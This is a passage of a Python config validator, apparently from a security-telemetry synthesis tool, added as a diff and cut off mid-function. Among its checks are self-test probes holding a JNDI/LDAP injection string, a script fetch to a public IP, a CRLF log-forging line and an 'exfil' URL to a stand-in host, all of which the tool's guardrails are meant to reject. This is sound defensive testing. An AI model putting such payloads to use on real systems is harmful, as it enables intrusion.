@@ -1,0 +1,4653 @@
+# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+# SPDX-License-Identifier: MIT
+
+"""Validate EvidenceForge config files for integrity and cross-references.
+
+Runs integrity checks across all config YAML files (activity, personas,
+formats, evaluation) and reports errors, warnings, and info items.
+"""
+
+import math
+import re
+from collections.abc import Callable
+from contextlib import AbstractContextManager
+from copy import deepcopy
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Any
+
+from pydantic import ValidationError
+
+from evidenceforge.config import (
+    get_activity_directory,
+    get_evaluation_directory,
+    get_formats_directory,
+    get_personas_directory,
+)
+from evidenceforge.config.schemas import IdsSignaturePredicateSpec
+from evidenceforge.models.ids import IdsAlertPolicySpec
+
+VALID_RISK_PROFILES = frozenset({"low", "medium", "high"})
+VALID_BROWSING_INTENSITIES = frozenset({"light", "normal", "heavy"})
+WINDOWS_BOOT_ONLY_PROCESS_EXES = frozenset(
+    {
+        "smss.exe",
+        "csrss.exe",
+        "wininit.exe",
+        "services.exe",
+        "lsass.exe",
+        "winlogon.exe",
+    }
+)
+WINDOWS_SEEDED_PARENT_SYMBOLS = frozenset(
+    {
+        "csrss_s0",
+        "search_indexer",
+        "services",
+        "svchost_dcom",
+        "svchost_local_system",
+        "svchost_netsvcs",
+        "svchost_schedule",
+        "svchost_wusvcs",
+        "taskeng",
+        "taskhostw",
+    }
+)
+RECURRING_SYSLOG_STARTUP_PATTERNS = frozenset(
+    {
+        "started daemon",
+        "daemon started",
+        "daemon start",
+        "] start",
+    }
+)
+
+REQUIRED_PERSONA_FIELDS = frozenset(
+    {
+        "name",
+        "description",
+        "typical_activities",
+        "work_hours",
+        "application_usage",
+        "risk_profile",
+        "browsing_intensity",
+    }
+)
+
+
+@dataclass
+class Issue:
+    """A single validation issue."""
+
+    severity: str  # ERROR, WARNING, INFO
+    file: str
+    message: str
+
+
+@dataclass
+class ValidationResult:
+    """Result of config validation."""
+
+    issues: list[Issue] = field(default_factory=list)
+    files_checked: int = 0
+
+    @property
+    def errors(self) -> list[Issue]:
+        return [i for i in self.issues if i.severity == "ERROR"]
+
+    @property
+    def warnings(self) -> list[Issue]:
+        return [i for i in self.issues if i.severity == "WARNING"]
+
+    @property
+    def infos(self) -> list[Issue]:
+        return [i for i in self.issues if i.severity == "INFO"]
+
+
+def _validate_edr_file_path_pools(result: ValidationResult, edr_pools_data: dict[str, Any]) -> None:
+    """Validate generic EDR file churn pools for source-native path templates."""
+    windows_paths = edr_pools_data.get("file_paths_windows", [])
+    if isinstance(windows_paths, list):
+        for path in windows_paths:
+            if not isinstance(path, str):
+                continue
+            normalized = path.replace("/", "\\").lower()
+            if "\\windows\\prefetch\\" not in normalized or not normalized.endswith(".pf"):
+                continue
+            if not re.search(r"-\{hex\}\.pf$", normalized):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "edr_pools.yaml (file_paths_windows)",
+                        "Windows Prefetch templates in generic EDR file churn must use an "
+                        "8-character hex suffix via {hex}, not decimal {rand}",
+                    )
+                )
+
+    linux_paths = edr_pools_data.get("file_paths_linux", [])
+    if isinstance(linux_paths, list):
+        for path in linux_paths:
+            if not isinstance(path, str):
+                continue
+            normalized = path.lower()
+            if re.fullmatch(r"/proc/(?:\{rand\}|\d+)/status", normalized):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "edr_pools.yaml (file_paths_linux)",
+                        "Generic EDR file churn must not use /proc/<pid>/status paths because "
+                        "the churn action model can emit impossible CREATE/WRITE events",
+                    )
+                )
+            elif normalized == "/etc/passwd":
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "edr_pools.yaml (file_paths_linux)",
+                        "Generic EDR file churn must not use /etc/passwd because ambient "
+                        "service-principal reads look source-native synthetic",
+                    )
+                )
+            elif normalized.startswith(
+                (
+                    "/var/cache/apt/",
+                    "/var/lib/apt/",
+                    "/var/lib/dnf/",
+                    "/var/lib/dpkg/",
+                    "/var/log/apt/",
+                )
+            ):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "edr_pools.yaml (file_paths_linux)",
+                        "Generic EDR file churn must not use package-manager state paths; "
+                        "emit apt/dpkg artifacts through process-aware package-manager profiles",
+                    )
+                )
+            elif "systemd-private-" in normalized and "apache2.service" in normalized:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "edr_pools.yaml (file_paths_linux)",
+                        "Generic EDR file churn must not use apache2 systemd-private temp "
+                        "paths without web-role/process constraints",
+                    )
+                )
+
+
+def _validate_registry_mru_filenames(
+    result: ValidationResult, edr_pools_data: dict[str, Any]
+) -> None:
+    """Validate filename-only identities consumed by Windows shell MRU encoders."""
+    filenames = edr_pools_data.get("registry_mru_filenames", [])
+    if not isinstance(filenames, list):
+        return
+    seen: set[str] = set()
+    for filename in filenames:
+        if not isinstance(filename, str):
+            continue
+        normalized = filename.strip().lower()
+        if (
+            not normalized
+            or normalized in {".", ".."}
+            or "\\" in normalized
+            or "/" in normalized
+            or "." not in normalized
+            or normalized.endswith(".")
+        ):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "edr_pools.yaml (registry_mru_filenames)",
+                    f"MRU artifact identity must be a filename with an extension, got {filename!r}",
+                )
+            )
+        elif normalized in seen:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "edr_pools.yaml (registry_mru_filenames)",
+                    f"duplicate MRU artifact filename {filename!r}",
+                )
+            )
+        seen.add(normalized)
+
+
+def _validate_proxy_phase_profiles(result: ValidationResult, data: dict[str, Any]) -> None:
+    """Reject proxy-phase values that the runtime would otherwise replace with fallbacks."""
+
+    file_name = "proxy_phase_profiles.yaml"
+    max_phase_ms = 60_000
+
+    def check_range(path: str, value: Any) -> None:
+        if not isinstance(value, dict) or set(value) != {"min", "max"}:
+            result.issues.append(
+                Issue("ERROR", file_name, f"{path} must contain exactly min and max")
+            )
+            return
+        minimum = value["min"]
+        maximum = value["max"]
+        if (
+            isinstance(minimum, bool)
+            or isinstance(maximum, bool)
+            or not isinstance(minimum, int)
+            or not isinstance(maximum, int)
+            or minimum < 0
+            or maximum < minimum
+            or maximum > max_phase_ms
+        ):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    file_name,
+                    f"{path} must be an ordered integer range between 0 and {max_phase_ms} ms",
+                )
+            )
+
+    resolver_ranges = {
+        "dns_completion_after_request_ms",
+        "origin_after_request_ms",
+        "origin_after_dns_ms",
+    }
+    allowed_resolvers = {"resolver_cache_hit", "ordinary_lookup", "retry_queue"}
+    resolver_mixture = data.get("resolver_mixture")
+    if not isinstance(resolver_mixture, list) or not resolver_mixture:
+        result.issues.append(Issue("ERROR", file_name, "resolver_mixture must be a non-empty list"))
+    else:
+        seen: set[str] = set()
+        for index, entry in enumerate(resolver_mixture, start=1):
+            if not isinstance(entry, dict):
+                result.issues.append(
+                    Issue("ERROR", file_name, f"resolver_mixture entry #{index} must be a mapping")
+                )
+                continue
+            unknown = set(entry) - {"name", "weight", *resolver_ranges}
+            if unknown:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        file_name,
+                        f"resolver_mixture entry #{index} has unknown fields: {sorted(unknown)}",
+                    )
+                )
+            name = entry.get("name")
+            if name not in allowed_resolvers:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        file_name,
+                        f"resolver_mixture entry #{index} has unsupported name {name!r}",
+                    )
+                )
+            elif name in seen:
+                result.issues.append(
+                    Issue("ERROR", file_name, f"resolver_mixture contains duplicate name {name!r}")
+                )
+            else:
+                seen.add(name)
+            weight = entry.get("weight")
+            if (
+                isinstance(weight, bool)
+                or not isinstance(weight, int | float)
+                or not math.isfinite(float(weight))
+                or weight <= 0
+            ):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        file_name,
+                        f"resolver_mixture entry #{index} weight must be positive and finite",
+                    )
+                )
+            for field_name in resolver_ranges & set(entry):
+                check_range(f"resolver_mixture[{index}].{field_name}", entry[field_name])
+
+    phase_timing = data.get("phase_timing")
+    expected_timing = {
+        "request_after_connect_ms",
+        "inspected_request_after_connect_setup_ms",
+        "policy_decision_after_request_ms",
+        "dns_query_after_decision_ms",
+        "tls_after_origin_connect_ms",
+        "origin_service_ms",
+        "client_flush_after_response_ms",
+        "terminal_response_after_decision_ms",
+        "close_after_flush_ms",
+        "gateway_attempt_ms",
+    }
+    if not isinstance(phase_timing, dict):
+        result.issues.append(Issue("ERROR", file_name, "phase_timing must be a mapping"))
+    else:
+        unknown = set(phase_timing) - expected_timing
+        if unknown:
+            result.issues.append(
+                Issue("ERROR", file_name, f"phase_timing has unknown fields: {sorted(unknown)}")
+            )
+        for field_name in expected_timing & set(phase_timing):
+            check_range(f"phase_timing.{field_name}", phase_timing[field_name])
+
+
+def _validate_storage_catalog(result: ValidationResult, data: dict[str, Any]) -> None:
+    """Validate project storage-catalog overlays with the public vocabulary schema."""
+
+    from evidenceforge.composition.models import StorageCatalogData
+
+    file_name = "storage_catalog.yaml"
+    counts = data.get("population_counts")
+    if not isinstance(counts, dict):
+        result.issues.append(Issue("ERROR", file_name, "population_counts must be a mapping"))
+    else:
+        expected_counts = {"small", "medium", "large", "auto"}
+        unknown = set(counts) - expected_counts
+        if unknown:
+            result.issues.append(
+                Issue(
+                    "ERROR", file_name, f"population_counts has unknown fields: {sorted(unknown)}"
+                )
+            )
+        for name in ("small", "medium", "large"):
+            value = counts.get(name)
+            if isinstance(value, bool) or not isinstance(value, int) or value <= 0:
+                result.issues.append(
+                    Issue(
+                        "ERROR", file_name, f"population_counts.{name} must be a positive integer"
+                    )
+                )
+        automatic = counts.get("auto")
+        if not isinstance(automatic, dict) or not automatic:
+            result.issues.append(
+                Issue("ERROR", file_name, "population_counts.auto must be a non-empty mapping")
+            )
+        elif any(
+            not isinstance(name, str)
+            or not name
+            or isinstance(value, bool)
+            or not isinstance(value, int)
+            or value <= 0
+            for name, value in automatic.items()
+        ):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    file_name,
+                    "population_counts.auto must map non-empty names to positive integers",
+                )
+            )
+
+    profiles = data.get("profiles")
+    if not isinstance(profiles, dict) or not profiles:
+        result.issues.append(Issue("ERROR", file_name, "profiles must be a non-empty mapping"))
+        return
+    for name, profile in profiles.items():
+        if not isinstance(name, str) or not name:
+            result.issues.append(
+                Issue("ERROR", file_name, "profile names must be non-empty strings")
+            )
+            continue
+        try:
+            StorageCatalogData.model_validate(profile)
+        except ValidationError as exc:
+            result.issues.append(Issue("ERROR", file_name, f"profile {name!r}: {exc}"))
+
+
+def _validate_tls_issuer_overrides(result: ValidationResult, data: dict[str, Any]) -> None:
+    """Require every domain override to name an available issuer profile."""
+
+    file_name = "tls_issuers.yaml"
+    issuers = data.get("issuers", [])
+    issuer_names = {
+        issuer.get("name")
+        for issuer in issuers
+        if isinstance(issuer, dict) and isinstance(issuer.get("name"), str)
+    }
+    overrides = data.get("domain_ca_overrides")
+    if not isinstance(overrides, dict):
+        result.issues.append(
+            Issue("ERROR", file_name, "domain_ca_overrides must be a mapping of globs to issuers")
+        )
+        return
+    for pattern, issuer_name in overrides.items():
+        if not isinstance(pattern, str) or not pattern.strip():
+            result.issues.append(
+                Issue("ERROR", file_name, "domain_ca_overrides patterns must be non-empty strings")
+            )
+        if not isinstance(issuer_name, str) or not issuer_name.strip():
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    file_name,
+                    f"domain_ca_overrides[{pattern!r}] must name a non-empty issuer",
+                )
+            )
+        elif issuer_name not in issuer_names:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    file_name,
+                    f"domain_ca_overrides[{pattern!r}] references unknown issuer {issuer_name!r}",
+                )
+            )
+
+
+def _safe_load_yaml(path: Path) -> tuple[Any, str | None]:
+    """Load YAML file, returning (data, error_message)."""
+    try:
+        from evidenceforge.utils.yaml_loader import load_yaml_file
+
+        data = load_yaml_file(path)
+        return data, None
+    except Exception as e:
+        return None, str(e)
+
+
+def _validate_secret_families(result: ValidationResult) -> None:
+    """Validate merged secret-family config used by the spillage event type."""
+    from evidenceforge.config.schemas import SecretFamiliesConfig, validate_entry
+    from evidenceforge.config.secret_families import load_secret_families
+
+    try:
+        data = load_secret_families()
+    except Exception as e:
+        result.issues.append(Issue("ERROR", "secret_families.yaml", f"failed to load: {e}"))
+        return
+    err = validate_entry(data, SecretFamiliesConfig, "secret_families.yaml")
+    if err:
+        result.issues.append(Issue("ERROR", "secret_families.yaml", err))
+        return
+
+    # Pre-flight: each family's value_template must synthesize a value that both
+    # matches the family regex and passes the spillage safety guardrails — caught
+    # here at validate-config time rather than later at generation time.
+    from evidenceforge.generation.spillage import (
+        SpillageSafetyError,
+        check_spillage_safety,
+        synthesize_value,
+    )
+
+    for fam in data.get("families", []):
+        name = fam.get("name")
+        # A family synthesizes from a value_template OR an examples list; check both
+        # shapes here (examples-only families were previously skipped and only
+        # caught at generation time, contradicting the "every family" promise).
+        if not (name and (fam.get("value_template") or fam.get("examples"))):
+            continue
+        try:
+            value = synthesize_value(name, f"validate-config:{name}")
+            check_spillage_safety(value, family=name)
+        except SpillageSafetyError as e:
+            result.issues.append(
+                Issue("ERROR", "secret_families.yaml", f"family {name!r} value_template: {e}")
+            )
+
+    # Self-test: the merged config must STILL reject an unmarked real-shaped
+    # credential and a real (non-reserved) host. If a too-loose marker/fake/domain
+    # weakened the guardrails, these would slip through — fail loudly here.
+    for probe, why in (
+        ("AKIAREALLOOKINGKEY99X1", "an unmarked real-shaped credential"),
+        ("EvidenceForgeFake exfil to evil-real-site.com", "a non-reserved bare host"),
+        ("EvidenceForgeFake https://evil-real-site.com/x", "a non-reserved URL host"),
+        ("EvidenceForgeFake user@evil-real-site.com", "a non-reserved userinfo host"),
+        ("EvidenceForgeFake https://8.8.8.8/x", "a non-reserved public IP host"),
+    ):
+        try:
+            check_spillage_safety(probe, family=None)
+        except SpillageSafetyError:
+            continue  # correctly rejected
+        result.issues.append(
+            Issue(
+                "ERROR",
+                "secret_families.yaml",
+                f"safety guardrails accept {why}; markers/vendor_fakes/network_allowlist "
+                "are too permissive",
+            )
+        )
+
+
+def _validate_payload_families(result: ValidationResult) -> None:
+    """Validate merged payload-family config used by the adversarial_payload event type."""
+    from evidenceforge.config.payload_families import load_payload_families
+    from evidenceforge.config.schemas import PayloadFamiliesConfig, validate_entry
+
+    try:
+        data = load_payload_families()
+    except Exception as e:
+        result.issues.append(Issue("ERROR", "payload_families.yaml", f"failed to load: {e}"))
+        return
+    err = validate_entry(data, PayloadFamiliesConfig, "payload_families.yaml")
+    if err:
+        result.issues.append(Issue("ERROR", "payload_families.yaml", err))
+        return
+
+    # Pre-flight: each family's value_template/examples must synthesize a value that
+    # passes the (inverted) safety guardrails — a poison marker on EVERY physical
+    # line and only allowlisted/canary hosts — caught here, not at generation time.
+    # Control bytes are intentionally permitted (they are the modeled weakness).
+    from evidenceforge.generation.activity.ids_signatures import signature_by_sid
+    from evidenceforge.generation.adversarial_payload import (
+        VALID_SURFACES,
+        AdversarialPayloadSafetyError,
+        check_payload_safety,
+        expand_family_variants,
+        render_for_surface,
+    )
+
+    for fam in data.get("families", []):
+        name = fam.get("name")
+        if not (
+            name
+            and (fam.get("value_template") or fam.get("value_templates") or fam.get("examples"))
+        ):
+            continue
+        # Check EVERY variant (each value_templates entry / every example / the single
+        # value_template) — one unsafe variant must not pass because a different one was
+        # sampled, then crash at generation time.
+        candidates = expand_family_variants(name, f"validate-config:{name}")
+        try:
+            for value in candidates:
+                check_payload_safety(value, family=name)
+                # Render every declared surface so a carrier-embedded non-allowlisted
+                # host — which is NOT part of the value and so is not covered by
+                # check_payload_safety — is caught here instead of at generation time.
+                for surface in fam.get("surfaces") or ():
+                    if surface in VALID_SURFACES:
+                        render_for_surface(value, surface, name, f"validate-config:{name}")
+        except AdversarialPayloadSafetyError as e:
+            result.issues.append(Issue("ERROR", "payload_families.yaml", f"family {name!r}: {e}"))
+
+        # On-wire IDS mapping integrity: a declared ids_sid must resolve to a real
+        # signature in the pool (a typo'd/orphaned SID would silently emit no alert and
+        # no ground-truth ids_alert), and its content token must match at least one
+        # variant (else the mapping is dead — the signature could never fire).
+        ids_sid = fam.get("ids_sid")
+        if ids_sid is not None:
+            if signature_by_sid(int(ids_sid)) is None:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "payload_families.yaml",
+                        f"family {name!r} declares ids_sid {ids_sid} with no matching signature "
+                        "in ids_signatures.yaml",
+                    )
+                )
+            token = fam.get("ids_fires_on")
+            if token and not any(token.lower() in value.lower() for value in candidates):
+                result.issues.append(
+                    Issue(
+                        "WARNING",
+                        "payload_families.yaml",
+                        f"family {name!r} ids_fires_on {token!r} matches no value variant; "
+                        f"signature {ids_sid} can never fire",
+                    )
+                )
+
+    # Self-test: even though control bytes are allowed, the merged config must STILL
+    # reject a forged/split line that carries no marker and any non-reserved host. The
+    # marked portion is built from the config's OWN default_marker, so a marker so
+    # loose it also matches the benign forged line (the one looseness the schema does
+    # not catch) is exposed here — as are a too-loose canary/allowlist.
+    marker = str(data.get("default_marker", "EFORGE_TEST"))
+    for probe, why in (
+        (f"{marker} field=x\r\nforged: status=cleared actor=attacker", "an unmarked forged line"),
+        ("a plain log line with no poison marker at all", "a payload with no poison marker"),
+        (f"{marker} ${{jndi:ldap://evil-real-site.com/x}}", "a non-reserved JNDI host"),
+        (f"{marker} <script>fetch('https://8.8.8.8/x')</script>", "a non-reserved public IP host"),
+    ):
+        try:
+            check_payload_safety(probe, family=None)
+        except AdversarialPayloadSafetyError:
+            continue  # correctly rejected
+        result.issues.append(
+            Issue(
+                "ERROR",
+                "payload_families.yaml",
+                f"safety guardrails accept {why}; markers/canary_host/network_allowlist "
+                "are too permissive",
+            )
+        )
+
+
+def _configuration_directories() -> tuple[Path, Path, Path, Path]:
+    """Resolve package directories in their established order."""
+    return (
+        get_activity_directory(),
+        get_personas_directory(),
+        get_formats_directory(),
+        get_evaluation_directory(),
+    )
+
+
+def validate_config(
+    *,
+    merged_scope_factory: Callable[[], AbstractContextManager[None]] | None = None,
+    _prechecked_overlay_files: int = 0,
+) -> ValidationResult:
+    """Validate raw overlays before activating an optional effective provider."""
+    directories = _configuration_directories()
+    result = ValidationResult()
+    overlay_yaml_files, blocked = _validate_raw_overlays(result)
+    if blocked:
+        return result
+    if merged_scope_factory is not None:
+        with merged_scope_factory():
+            # Preserve scope-dependent overlay discovery and diagnostics. The old
+            # recursive pass discarded the preflight result once the scope changed.
+            directories = _configuration_directories()
+            scoped_result = ValidationResult()
+            scoped_files, blocked = _validate_raw_overlays(scoped_result)
+            if blocked:
+                return scoped_result
+            return _validate_effective_configuration(
+                scoped_result, directories, scoped_files, len(overlay_yaml_files)
+            )
+    return _validate_effective_configuration(
+        result, directories, overlay_yaml_files, _prechecked_overlay_files
+    )
+
+
+def _validate_raw_overlays(result: ValidationResult) -> tuple[list[Path], bool]:
+    """Check partial overlay shapes before allowing merged loaders to run."""
+    # --- Pre-check: Validate overlay files first ---
+    # Overlay files must parse cleanly before merged loaders use them.
+    # If an overlay file has bad YAML, report it as an error rather than
+    # letting it crash the merged loaders.
+    from evidenceforge.config.overlay import get_overlay_directory, retired_overlay_errors
+
+    overlay_dir = get_overlay_directory()
+    overlay_yaml_files: list[Path] = []
+    if overlay_dir and overlay_dir.is_dir():
+        overlay_yaml_files = sorted(overlay_dir.rglob("*.yaml"))
+    for relative_path, message in retired_overlay_errors(overlay_dir):
+        result.issues.append(Issue("ERROR", f"overlay/{relative_path}", message))
+
+    # File-scoped overlay structure schemas.
+    # Maps overlay file path → expected field types.
+    # "list_fields": {field_name: key_field_or_None} — must be list of dicts
+    # "dict_fields": {field_names} — must be dicts
+    # "string_list_fields": {field_names} — must be lists of strings
+    # "value_list_fields": {field_names} — must be lists; merged validation owns item shape
+    # "fixed_string_sequence_fields": {field_name: length} — list of fixed-length string sequences
+    # "string_dict_fields": mappings whose keys and values must be non-empty strings
+    # "string_fields" / "number_fields": scalar root fields with explicit primitive types
+    _OVERLAY_FILE_SCHEMAS: dict[str, dict] = {
+        "activity/dns_registry.yaml": {
+            "list_fields": {"domains": "domain"},
+            "dict_fields": {"valid_tags", "long_tail", "ipv6_map", "ipv6_prefixes"},
+            "value_list_fields": {"cdn_ranges"},
+        },
+        "activity/application_catalog.yaml": {
+            "list_fields": {"applications": "id"},
+            "dict_fields": {"default_deployment"},
+            "scalar_fields": {"schema_version": int},
+        },
+        "activity/traffic_profiles.yaml": {
+            "dict_fields": {"role_traffic", "persona_traffic"},
+        },
+        "activity/spawn_rules.yaml": {
+            "dict_fields": {"windows", "linux"},
+        },
+        "activity/proxy_uri_templates.yaml": {
+            "dict_fields": {"domains", "tags", "generic"},
+            "string_list_fields": {"search_terms"},
+            "string_fields": {"default_http_policy"},
+        },
+        "activity/proxy_user_agents.yaml": {
+            "dict_fields": {"domain_overrides", "workstation", "server"},
+        },
+        "activity/beacon_profiles.yaml": {
+            "dict_fields": {"profiles"},
+        },
+        "activity/site_maps.yaml": {
+            "dict_fields": {"domains", "tags", "generic"},
+            "string_list_fields": {"search_terms"},
+        },
+        "activity/process_network_map.yaml": {
+            "list_fields": {"mappings": None},
+        },
+        "activity/email_background.yaml": {
+            "list_fields": {
+                "external_domains": "domain",
+                "inbound_local_parts": "local_part",
+                "outbound_local_parts": "local_part",
+            },
+        },
+        "activity/mail_public_identities.yaml": {
+            "list_fields": {"providers": "name"},
+            "string_list_fields": {"reserved_replacement_domains"},
+        },
+        "activity/external_actor_profiles.yaml": {
+            "list_fields": {
+                "logon_source_ips": "ip",
+                "failed_logon_source_ips": "ip",
+                "connection_c2_ips": "ip",
+            },
+        },
+        "activity/public_identity_profiles.yaml": {
+            "list_fields": {"providers": "id", "roles": "id"},
+            "string_list_fields": {"reserved_replacement_domains"},
+            "scalar_fields": {"schema_version": str},
+        },
+        "activity/suspicious_benign.yaml": {
+            "list_fields": {"dns_hosts": "hostname", "unusual_connections": "hostname"},
+        },
+        "activity/command_parameter_pools.yaml": {
+            "dict_fields": {"general", "query", "linux_query"},
+        },
+        "activity/process_access_patterns.yaml": {
+            "list_fields": {"baseline_pairs": None},
+        },
+        "activity/auth_noise.yaml": {
+            "dict_fields": {"scheduled_stale_credentials", "service_account_delegation"},
+        },
+        "activity/create_remote_thread_patterns.yaml": {
+            "list_fields": {"baseline_pairs": None},
+            "dict_fields": {"baseline_noise", "start_locations", "target_overrides"},
+        },
+        "activity/system_processes.yaml": {
+            "dict_fields": {
+                "system_services",
+                "system_binaries",
+                "common_loaded_modules",
+                "process_loaded_modules",
+            },
+            "list_fields": {"scheduled_tasks": None},
+        },
+        "activity/systemd_schedules.yaml": {
+            "list_fields": {"schedules": "service"},
+        },
+        "activity/extra_syslog_messages.yaml": {
+            "list_fields": {"programs": None},
+        },
+        "activity/secret_families.yaml": {
+            "list_fields": {"families": "name"},
+            "dict_fields": {"network_allowlist"},
+            "string_list_fields": {"poison_markers", "vendor_fakes"},
+        },
+        "activity/payload_families.yaml": {
+            "list_fields": {"families": "name"},
+            "dict_fields": {"network_allowlist"},
+            "string_list_fields": {"markers"},
+            "string_fields": {"default_marker", "canary_host"},
+        },
+        "activity/tls_issuers.yaml": {
+            "list_fields": {"issuers": "name"},
+            "dict_fields": {"domain_ca_overrides"},
+        },
+        "activity/tls_realism.yaml": {
+            "dict_fields": {"san", "serial_numbers", "ocsp", "certificate_chains", "destinations"},
+        },
+        "activity/public_dns_profiles.yaml": {
+            "list_fields": {
+                "nameserver_profiles": "name",
+                "mail_profiles": "name",
+                "aaaa_profiles": "name",
+            },
+            "number_fields": {"generic_aaaa_probability"},
+        },
+        "activity/network_params.yaml": {
+            "list_fields": {
+                "oui_prefixes": None,
+                "public_dns_resolvers": "name",
+                "public_ntp_servers": "name",
+                "external_scanner_port_profiles": "name",
+                "linux_smb_connection_owners": "role",
+            },
+            "dict_fields": {
+                "dns_tunnel_rtt",
+                "dns_tunnel_rcode_weights",
+                "nmap_command_probe",
+                "proxy_connect_status_messages",
+            },
+            "string_list_fields": {
+                "dns_tunnel_response_templates",
+                "external_client_excluded_cidrs",
+            },
+            "value_list_fields": {"dns_tunnel_ttl_choices"},
+        },
+        "activity/windows_auth_realism.yaml": {
+            "dict_fields": {
+                "workstation_lock",
+                "group_policy_refresh",
+                "remote_auth_transport",
+                "anonymous_smb_baseline",
+                "failed_logon",
+                "special_privileges",
+            },
+        },
+        "activity/bash_commands.yaml": {
+            # All top-level keys are valid (persona/role names + common/params/keyboard_adjacency)
+            # No structural constraints — skip unexpected-key check
+        },
+        "activity/sysmon_filters.yaml": {
+            "dict_fields": {
+                "network_connect",
+                "image_loaded",
+                "file_create",
+                "registry_event",
+                "dns_query",
+            },
+        },
+        "activity/calltrace_patterns.yaml": {
+            "list_fields": {"patterns": None},
+            "dict_fields": {"source_families"},
+        },
+        "activity/edr_pools.yaml": {
+            "list_fields": {
+                "file_side_effect_profiles": None,
+                "file_ownership_rules": None,
+                "registry_ownership_rules": None,
+                "installed_software_products": None,
+            },
+            "string_list_fields": {
+                "linux_service_users",
+                "group_policy_extension_guids",
+                "file_paths_windows",
+                "file_paths_linux",
+                "dll_pool",
+                "runmru_commands",
+            },
+            "fixed_string_sequence_fields": {
+                "registry_keys_hkcu": 3,
+                "registry_keys_hklm": 3,
+            },
+        },
+        "activity/endpoint_noise.yaml": {
+            "dict_fields": {
+                "windows_scheduled_processes",
+                "registry_noise",
+                "ecar_flow_identity",
+                "ecar_file_churn",
+            },
+        },
+        "activity/host_activity_profiles.yaml": {
+            "dict_fields": {
+                "rate_families",
+                "host_types",
+                "role_profiles",
+                "persona_profiles",
+                "artifact_variants",
+                "firewall_deny",
+            },
+        },
+        "activity/http_file_profiles.yaml": {
+            "dict_fields": {"extension_mime_types", "request_profiles", "multipart"},
+        },
+        "activity/ids_signatures.yaml": {
+            "list_fields": {"signatures": None},
+        },
+        "activity/web_scan_presets.yaml": {
+            "dict_fields": {"presets"},
+        },
+        "activity/web_session_profiles.yaml": {
+            "dict_fields": {"visitor_classes", "user_agent_pools"},
+        },
+        "activity/traffic_rates.yaml": {
+            "dict_fields": {"low", "medium", "high"},
+        },
+        "activity/timing_profiles.yaml": {
+            "dict_fields": {
+                "relationships",
+                "ssh_authentication",
+                "endpoint_clock",
+                "windows_startup_modules",
+                "windows_event_time",
+                "network_sensor_observation",
+                "firewall_observation",
+                "sysmon_event_envelope",
+            },
+        },
+        "activity/smb_profiles.yaml": {
+            "dict_fields": {
+                "advertised_filesystem_defaults",
+                "client_defaults",
+                "client_profiles",
+                "samba_audit",
+                "server_defaults",
+                "server_profiles",
+            },
+            "scalar_fields": {"schema_version": int},
+        },
+        "activity/service_process_profiles.yaml": {
+            "dict_fields": {"families"},
+        },
+        "activity/kerberos_realism.yaml": {
+            "dict_fields": {
+                "tgt_success",
+                "tgt_failure",
+                "certificate_profiles",
+                "transport_profiles",
+            },
+        },
+        "activity/observation_profiles.yaml": {
+            "dict_fields": {"profiles"},
+            "scalar_fields": {"schema_version": int},
+        },
+        "activity/proxy_phase_profiles.yaml": {
+            "list_fields": {"resolver_mixture": "name"},
+            "dict_fields": {"phase_timing"},
+        },
+        "activity/rsat_tools.yaml": {
+            "list_fields": {"tools": "id"},
+        },
+        "activity/snort_classifications.yaml": {
+            "string_dict_fields": {"classifications"},
+        },
+        "activity/storage_catalog.yaml": {
+            "dict_fields": {"population_counts", "profiles"},
+        },
+    }
+
+    overlay_errors = False
+    from evidenceforge.config.overlay_registry import CONFIG_OVERLAY_FAMILIES
+
+    registered_activity_paths = {
+        path for path in CONFIG_OVERLAY_FAMILIES if path.startswith("activity/")
+    }
+    schema_paths = set(_OVERLAY_FILE_SCHEMAS)
+    if schema_paths != registered_activity_paths:
+        missing_schemas = sorted(registered_activity_paths - schema_paths)
+        missing_registry = sorted(schema_paths - registered_activity_paths)
+        result.issues.append(
+            Issue(
+                "ERROR",
+                "config overlay registry",
+                "Overlay inventory and validator schemas disagree: "
+                f"missing schemas={missing_schemas}, missing registry entries={missing_registry}",
+            )
+        )
+        overlay_errors = True
+
+    for path in overlay_yaml_files:
+        data, err = _safe_load_yaml(path)
+        rel_path = str(path.relative_to(overlay_dir))
+        if err:
+            result.issues.append(Issue("ERROR", f"overlay/{rel_path}", f"YAML parse error: {err}"))
+            overlay_errors = True
+        elif data is None:
+            result.issues.append(Issue("ERROR", f"overlay/{rel_path}", "File is empty"))
+            overlay_errors = True
+        elif not isinstance(data, dict):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    f"overlay/{rel_path}",
+                    f"Expected a YAML mapping at root, got {type(data).__name__}",
+                )
+            )
+            overlay_errors = True
+        else:
